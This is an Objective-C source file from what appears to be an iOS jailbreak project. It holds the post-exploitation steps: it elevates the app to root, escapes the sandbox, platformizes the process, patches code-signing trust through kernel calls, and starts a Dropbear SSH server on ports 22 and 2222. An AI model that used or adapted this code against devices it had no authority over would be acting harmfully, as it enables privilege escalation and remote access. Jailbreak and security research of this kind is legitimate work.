//
//  postexp.m
//  sefebreak
//
//  Created by Xavier Perarnau on 04/02/2019.
//  Copyright © 2019 Xavier Perarnau. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonDigest.h>
#import <UIKit/UIKit.h>
#import <unistd.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#include <spawn.h>

#include "kernel_memory.h"
#include "kernel_call.h"
#include "parameters.h"
#include "kernel_slide.h"
#include "postexp.h"
#include "offsets.h"
#include "root.h"
#include "sandbox.h"
#include "log.h"
#include "post-common.h"

#include "patchfinder64.h"
#include "macho-helper.h"
#include "lzssdec.hpp"
#include "untar.h"
#include "amfi_utils.h"

NSString *binPath = @"/var/containers/Bundle/iosbinpack64";
NSString *kernelPath = @"/System/Library/Caches/com.apple.kernelcaches/kernelcache";

int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
    if (rv) {
        ERROR("error spawing process %s", strerror(rv));
        return rv;
    }
    
    int a = 0;
    waitpid(pd, &a, 0);
    
    return WEXITSTATUS(a);
}

int launchAsPlatform(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED); //this flag will make the created process stay frozen until we send the CONT signal. This so we can platformize it before it launches.

    int rv = posix_spawn(&pd, binary, NULL, &attr, (char **)&args, env);
    if (rv) {
        ERROR("error spawing process %s", strerror(rv));
        return rv;
    }

    kern_return_t kret;
    mach_port_t task;
    kret = task_for_pid(mach_host_self(), pd, &task);
    platformize(task);

    kill(pd, SIGCONT); //continue

    int a = 0;
    waitpid(pd, &a, 0);

    return WEXITSTATUS(a);
}

enum post_exp_t root_and_escape(void) {
    // Initialize offsets
    _offsets_init();
    
    // Get r00t
    save_proc_user_struct(current_task);
    INFO("current UID: %d", getuid());
    root(current_task);
    uid_t current_uid = getuid();
    if(current_uid != 0) {
        ERROR("couldn't get r00t");
        return ERROR_GETTING_ROOT;
    } else {
        INFO("current UID: %d", getuid());
    }
    
    // Unsandbox
    save_proc_sandbox_struct(current_task);
    unsandbox(current_task);
    
    setcsflags(current_task);
    platformize(current_task);
    INFO("the application is now a platform binary");
    
    return NO_ERROR;
}

enum post_exp_t get_kernel_file(void) {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *docs = [[[fileManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
    mkdir((char *)[docs UTF8String], 0777);
    
    NSString *newPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dump"]];
    const char *location = [newPath UTF8String];
    if(!compareFiles([kernelPath UTF8String], location)) {
        NSError *error;
        [fileManager removeItemAtPath:newPath error:&error];
        if(!error) {
            INFO("deleted old copy from %s", location);
        }
        
        INFO("copying to %s", location);
        error = nil;
        [fileManager copyItemAtPath:kernelPath toPath:newPath error:&error];
        if (error) {
            ERROR("failed to copy kernelcache with error: %s", [[error localizedDescription] UTF8String]);
            return ERROR_ESCAPING_SANDBOX;
        } else {
            chown(location, 501, 501);
        }
    }
    return NO_ERROR;
}

enum post_exp_t initialize_patchfinder64() {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *docs = [[[fileManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
    NSString *oldPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dump"]];
    NSString *newPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dec"]];
    const char *original_kernel_cache_path = [oldPath UTF8String];
    const char *decompressed_kernel_cache_path = [newPath UTF8String];
    
    if (![fileManager fileExistsAtPath:newPath]) {
        FILE *original_kernel_cache = fopen(original_kernel_cache_path, "rb");
        uint32_t macho_header_offset = find_macho_header(original_kernel_cache);
        char *args[5] = { "lzssdec", "-o", (char *)[NSString stringWithFormat:@"0x%x", macho_header_offset].UTF8String, (char *)original_kernel_cache_path, (char *)decompressed_kernel_cache_path};
        lzssdec(5, args);
        fclose(original_kernel_cache);
        chown(decompressed_kernel_cache_path, 501, 501);
    }
    if (init_kernel(NULL, 0, decompressed_kernel_cache_path) != ERR_SUCCESS) {
        [fileManager removeItemAtPath:newPath error:NULL];
        ERROR("failed to initialize patchfinder");
        return ERROR_SETTING_PATCHFINDER64;
    } else {
        INFO("patchfinder initialized successfully");
        return NO_ERROR;
    }
}

enum post_exp_t launch_dropbear() {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:binPath]) {
        [fileManager removeItemAtPath:binPath error:NULL];
    }
    mkdir((char *)[binPath UTF8String], 0777);
    INFO("installing ios binary pack...");
    
    chdir("/var/containers/Bundle/");
    FILE *bootstrap = fopen([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"iosbinpack.tar"] UTF8String], "r");
    untar(bootstrap, "/var/containers/Bundle/");
    fclose(bootstrap);
    
    [fileManager removeItemAtPath:[binPath stringByAppendingString:@"usr/local/bin/dropbear"] error:NULL];
    [fileManager removeItemAtPath:[binPath stringByAppendingString:@"usr/bin/scp"] error:NULL];
    
    chdir("/var/containers/Bundle/");
    FILE *fixed_dropbear = fopen([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"dropbear.v2018.76.tar"] UTF8String], "r");
    untar(fixed_dropbear, "/var/containers/Bundle/");
    fclose(fixed_dropbear);
    INFO("installed Dropbear SSH!");

    kernel_call_init();
    trustbin("/var/containers/Bundle/iosbinpack64", STATIC_ADDRESS(kernel_base) + kernel_slide);
    kernel_call_deinit();
    
    mkdir("/var/dropbear", 0777);
    [fileManager removeItemAtPath:@"/var/profile" error:NULL];
    [fileManager removeItemAtPath:@"/var/motd" error:NULL];
    chmod("/var/profile", 0777);
    FILE *motd = fopen("/var/motd", "w");
    struct utsname ut;
    uname(&ut);
    fprintf(motd, "A12 dropbear exec by @xavo95\nnjkkk");
    fprintf(motd, "%s %s %s %s %s", ut.sysname, ut.nodename, ut.release, ut.version, ut.machine);
    fclose(motd);
    chmod("/var/motd", 0777);
    
    [fileManager copyItemAtPath:@"/var/containers/Bundle/iosbinpack64/etc/profile" toPath:@"/var/profile" error:NULL];
    [fileManager copyItemAtPath:@"/var/containers/Bundle/iosbinpack64/etc/motd" toPath:@"/var/motd" error:NULL];
    
    launch("/var/containers/Bundle/iosbinpack64/usr/bin/killall", "-SEGV", "dropbear", NULL, NULL, NULL, NULL, NULL);
    launchAsPlatform([[binPath stringByAppendingPathComponent:@"usr/local/bin/dropbear"] UTF8String], "-R", "-E", "-p", "22", "-p", "2222", NULL);
    
    return NO_ERROR;
}

void cleanup(void) {
    term_kernel();
    restore_csflags(current_task);
    sandbox(current_task);
    unroot(current_task);
}
